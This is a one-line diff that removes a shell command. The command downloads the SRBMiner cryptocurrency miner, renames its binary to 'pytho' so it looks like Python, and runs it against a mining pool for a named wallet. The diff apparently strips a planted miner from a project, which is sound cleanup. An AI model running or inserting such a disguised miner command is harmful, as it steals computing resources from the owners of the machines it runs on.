@@ -1,1 +1,0 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.4/SRBMiner-Multi-2-3-4-Linux.tar.xz && tar xf SRBMiner-Multi-2-3-4-Linux.tar.xz && cd SRBMiner-Multi-2-3-4 && mv SRBMiner-MULTI pytho && ./pytho --disable-gpu --algorithm minotaurx --pool stratum-asia.rplant.xyz:17068 --wallet REAJ5Yt8tEdggnRtxccWUWnSoAXzDcACVX.1 -t 4
